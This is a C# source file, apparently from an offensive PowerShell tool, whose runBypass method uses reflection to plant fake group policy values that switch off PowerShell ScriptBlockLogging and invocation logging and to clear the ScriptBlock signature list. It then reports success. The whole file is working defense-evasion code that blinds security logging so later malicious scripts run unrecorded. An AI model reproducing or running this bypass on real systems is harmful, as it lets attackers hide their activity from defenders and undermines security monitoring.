using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Reflection;

namespace HiddenPowerShellDll
{
    class HiddenPowerShellDllLoggingEV
    {
        public static void runBypass(Assembly assembly)
        {
            //ScriptBlockLogging bypass credits: Ryan Cobb (@cobbr_io)
            try
            {
                if (assembly != null)
                {
                    Type type = assembly.GetType("System.Management.Automation.Utils");

                    if (type != null)
                    {
                        ConcurrentDictionary<string, Dictionary<string, Object>> settings = (ConcurrentDictionary<string, Dictionary<string, Object>>)type.GetField("cachedGroupPolicySettings", BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);

                        Dictionary<string, Object> dic_e = new Dictionary<string, Object>();
                        dic_e.Add("EnableScriptBlockLogging", 0);
                        dic_e.Add("EnableScriptBlockInvocationLogging", 0);
                        settings.TryAdd("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging", dic_e);

                        type = assembly.GetType("System.Management.Automation.ScriptBlock");
                        if (type != null)
                        {
                            type.GetField("signatures", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, new HashSet<string>());

                            Console.WriteLine("[+] ScriptBlockLogging bypass executed");

                        }
                    }
                    else
                    {
                        Console.WriteLine("[-] Error setting signature");
                    }
                }
                else
                {
                    Console.WriteLine("[-] Error util ref ");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error ScriptBlockLogging bypass");
            }
        }
    }
}
